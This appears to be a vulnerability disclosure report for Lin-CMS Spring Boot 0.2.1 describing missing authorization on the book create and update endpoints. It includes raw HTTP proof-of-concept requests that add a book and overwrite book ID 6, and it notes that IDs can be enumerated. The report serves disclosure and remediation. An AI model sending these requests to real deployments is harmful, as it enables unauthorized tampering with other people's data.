## Vulnerability Introduction


An unauthorized access vulnerability exists in version 0.2.1 of Lin-CMS Spring Boot. This vulnerability allows remote attackers to create arbitrary books without authorization by exploiting the book creation method within the `BookController.java` component, and to update the information of any existing book without authorization by exploiting the book update method.

## Vulnerability Analysis

### Unauthorized Arbitrary Book Creation Vulnerability

Vulnerable Class File: src/main/java/io/github/talelin/latticy/controller/v1/BookController.java

Line 63 of the file uses a POST request method to access the route /v1/book. Without any permission verification, the createBook() method is triggered, directly calling the database to create a book.

<img width="1889" height="799" alt="Pasted image 20260421113339" src="https://github.com/user-attachments/assets/95126948-479b-4e91-b3ec-e9bb4e6ccb4a" />



### Unauthorized Arbitrary Book Information Update Vulnerability

Vulnerable Class File: src/main/java/io/github/talelin/latticy/controller/v1/BookController.java

At line 70 of the file, a PUT request is utilized to access the route `/v1/book/{id}`. Notably, this endpoint lacks any form of access control or permission validation. Consequently, it triggers the `updateBook` method—which checks for the existence of a book corresponding to the provided `id` and, if found, directly updates its information—without any authorization checks. Furthermore, the `id` parameter follows a predictable, enumerable pattern. As a result, an attacker can iterate through the `id` values ​​to target every single book currently stored in the database, thereby modifying the information associated with each one.


<img width="1819" height="879" alt="Pasted image 20260421114116" src="https://github.com/user-attachments/assets/387276d4-ce1d-431f-8998-3d515794f4db" />

## Vulnerability Reproduction

### Unauthorized Arbitrary Book Creation Vulnerability

As you can see, there are currently no books in the `book` database table with the title "TEST".
<img width="1349" height="958" alt="Pasted image 20260421114236" src="https://github.com/user-attachments/assets/09a67e38-7183-46c6-a8aa-9e434a67c289" />


POC for Sending a Request Without Any Permissions:

```http
POST /v1/book HTTP/1.1
Host: 127.0.0.1:5000
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
Accept: application/json, text/plain, */*
Content-Type: application/json
Content-Length: 91

{
  "title": "TEST",
  "author": "TEST",
  "summary": "TEST",
  "image": "TEST.jsp"
}
```

<img width="955" height="800" alt="Pasted image 20260421114436" src="https://github.com/user-attachments/assets/92c85e44-2ce5-42ba-99aa-49fd6dc85236" />

response:

<img width="1917" height="752" alt="Pasted image 20260421114552" src="https://github.com/user-attachments/assets/1642d56c-20e2-4990-a84b-dcd915a7f459" />


In the database, it can be observed that the unauthorized addition of the "TEST book" was successful.

<img width="1364" height="846" alt="Pasted image 20260421114631" src="https://github.com/user-attachments/assets/c586c11b-772c-4176-b7e9-23595e60da78" />



### Unauthorized Arbitrary Book Information Update Vulnerability

Retrieve information for all books currently present in the database via `GET /v1/book`. The request is as follows:

```http
GET /v1/book HTTP/1.1
Host: 127.0.0.1:5000
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
Accept: application/json, text/plain, */*
Content-Type: application/json
Content-Length: 0
```

response:
<img width="1914" height="951" alt="Pasted image 20260421115201" src="https://github.com/user-attachments/assets/6b20d78b-9d37-4a77-85a9-85fe6e02083a" />



Upon discovering the existence of books with IDs ranging from 1 to 6, a simulated attack is performed against the book with ID 6. This is executed via a PUT request to the `/v1/book/6` route to update the book's information. The Proof of Concept (POC) is as follows:

```http
PUT /v1/book/6 HTTP/1.1
Host: 127.0.0.1:5000
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
Accept: application/json, text/plain, */*
Content-Type: application/json
Content-Length: 129

{
  "title": "Hacker",
  "author": "Hacker",
  "summary": "Hacker",
  "image": "Hacker.jsp"
}
```

The response is as follows:
<img width="1910" height="733" alt="Pasted image 20260421115440" src="https://github.com/user-attachments/assets/dc98b0ba-d8a3-4bb1-a426-167900cd6fba" />



Upon querying via `GET /v1/book`, it was discovered that the information for the book with `id=6` has been modified—specifically, it changed from "TEST" to "Hacker".

<img width="1920" height="879" alt="Pasted image 20260421115547" src="https://github.com/user-attachments/assets/d0c15c0d-7b01-453e-b321-a6115e2aa5e9" />


In the database, the information for the book with ID=6 has also been updated.
<img width="1423" height="905" alt="Pasted image 20260421115640" src="https://github.com/user-attachments/assets/2c7bc398-18c5-486c-b85b-a163fd844278" />

## Vulnerability Remediation Recommendations
Add permission annotations to the `createBook` and `updateBook` methods
